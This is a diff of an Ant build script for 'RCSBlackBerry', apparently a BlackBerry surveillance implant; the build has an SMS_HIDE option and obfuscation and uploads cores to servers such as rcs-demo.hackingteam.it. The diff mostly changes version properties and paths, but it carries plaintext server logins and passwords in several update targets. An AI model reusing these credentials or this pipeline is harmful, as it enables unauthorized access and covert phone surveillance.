@@ -62,12 +62,13 @@
 	<property name="preprocess.7.0.symbols" value="SMS_HIDE,MMS,OS_AT_LEAST_5" />
 	<property name="preprocess.7.1.symbols" value="SMS_HIDE,MMS,OS_AT_LEAST_5" />
 
-	<property name="javaloader" value="${jde.4.5.home}/bin/JavaLoader.exe" />
+	<property name="javaloader" value="${jde.javaloader}" />
 
 	<!-- Sources -->
 	<property name="lib.src" location="RCSBlackBerryResources/src" />
 	<property name="core.src" location="RCSBlackBerry/src" />
 
+	<echo>antenna: ${antenna.jar}</echo>
 	<!-- WTK Task definition -->
 	<taskdef name="wtkpreprocess" classname="de.pleumann.antenna.WtkPreprocess" classpath="${antenna.jar}" />
 	<taskdef name="wtkbuild" classname="de.pleumann.antenna.WtkBuild" classpath="${antenna.jar}" />
@@ -169,7 +170,7 @@
 			<echo message="=============" />
 			<echo message="===  LIB  ===" />
 			<echo message="=============" />
-			<echo>jde.home=${jde.home}</echo>
+			<echo>jde.home=${jde.home} wtk.home=${wtk.home}</echo>
 			<local name="builddir" />
 			<property name="builddir" location="build/lib/@{version}" />
 			<mkdir dir="${builddir}/unverified" />
@@ -312,6 +313,7 @@
 			</wtkpackage>
 
 			<!-- Obfuscate -dontshrink -->
+			<echo>wtk.proguard.home=${wtk.proguard.home}</echo>
 			<wtkobfuscate jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad">
 				<classpath refid="core.classpath" />
 				<argument value="'-keep public class blackberry.Main { public *; }'" />
@@ -386,7 +388,8 @@
 				<filter token="MODULE_NAME" value="${core.codename}" />
 				<filter token="MODULE_LIB_NAME" value="${lib.codename}" />
 				<filter token="RANDOM" value="${randomSalt}" />
-				<filter token="VERSION" value="${version}" />
+				<filter token="VERSION" value="${dist.version}" />
+				<filter token="RELEASE" value="${dist.release}" />
 				<filter token="OSVERSION" value="@{osversion}" />
 			</filterset>
 		</copy>
@@ -395,7 +398,7 @@
 
 	<target name="init" depends="encrypt-messages">
 		<echo message="=== Init ===" />
-		<echo message="=== Version ${version} ===" />
+		<echo message="=== Version ${dist.release} ${dist.version} ===" />
 		<tstamp>
 			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
 		</tstamp>
@@ -524,7 +527,7 @@
 		<sequential>
 			<echo>@{server}</echo>
 
-			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+			<exec executable="${ruby.path}" dir="." failonerror="true">
 				<arg value="${rcscore.path}/rcs-core.rb" />
 				<arg value="-u" />
 				<arg value="@{login}" />
@@ -546,20 +549,20 @@
       <copy file="output/45/${dist.core}" toDir="historicOutput/4.5/release" overwrite="true" />
   </target>
 	<target name="update">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\blackberry_${version}.zip" />
-		<copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\blackberry.zip" overwrite="true" />
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="./server/blackberry_${dist.version}.zip" />
+		<copy file="./server/blackberry_${dist.version}.zip" toFile="/Volumes/SHARE/RELEASE/SVILUPPO/cores daVinci/blackberry.zip" overwrite="true" />
 	</target>
 	
 	<target name="update-demo">
-		<updaterelease server="rcs-demo.hackingteam.it" login="zeno" password="zenop123" file=".\server\blackberry_${version}.zip" />
+		<updaterelease server="rcs-demo.hackingteam.it" login="zeno" password="zenop123" file="./server/blackberry_${dist.version}.zip" />
 	</target>
 	
 	<target name="update-castore">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\blackberry_${version}.zip" />
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="./server/blackberry_${dist.version}.zip" />
 	</target>
 	
 	<target name="update-zenotto">
-		<updaterelease server="zenotto" login="zeno" password="zenop123" file=".\server\blackberry_${version}.zip" />
+		<updaterelease server="zenotto" login="zeno" password="zenop123" file="./server/blackberry_${dist.version}.zip" />
 	</target>
 
 	<target name="addconf">
@@ -575,7 +578,7 @@
 		<copy toDir="server/core" overwrite="true">
 			<fileset dir="server/template" excludes="**/res" />
 			<filterset>
-				<filter token="VERSION" value="${version}" />
+				<filter token="VERSION" value="${dist.version}" />
 			</filterset>
 		</copy>
 		<copy toDir="server/core/res" overwrite="true">
@@ -596,7 +599,7 @@
 			</sequential>
 		</for>
 		
-		<zip destfile="server/blackberry_${version}.zip" basedir="server/core" />
+		<zip destfile="server/blackberry_${dist.version}.zip" basedir="server/core" />
 	</target>
 
 	<macrodef name="zipdist">
@@ -645,9 +648,8 @@
 		</tstamp>
 		<property file="build.number" />
 
-		<input message="Release (8.2)?" addproperty="do.release" defaultvalue="8.2" />
-		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
-		<echo>${destdir}</echo>
+		<var name="destdir" value="../dist/${dist.release}/${build.number}.${timestamp.BUILD}" />
+	
 
 		<!-- <rcscomp destdir="${destdir}/rcs7" version="4.5"/> -->
 
@@ -671,7 +673,8 @@
 
 		<antcall target="servercore" />
 		
-		<copy file="server/blackberry_${version}.zip" toDir="${destdir}" overwrite="true" />
+		<copy file="server/blackberry_${dist.version}.zip" toDir="${destdir}" overwrite="true" />
+		<copy file="server/blackberry_${dist.version}.zip" toFile="server/blackberry.zip" overwrite="true" />
 
 		<zipdist destfile="${destdir}/blackberry_sources.zip" />
 
@@ -682,8 +685,12 @@
 		</checksum>
 
 		<!-- <antcall target="update" /> -->
+		
+		<echo>${destdir}</echo>
 
 	</target>
+	
+	<target name="all" depends="build,dist" />
 
 
 	<!-- To run the application in simulator
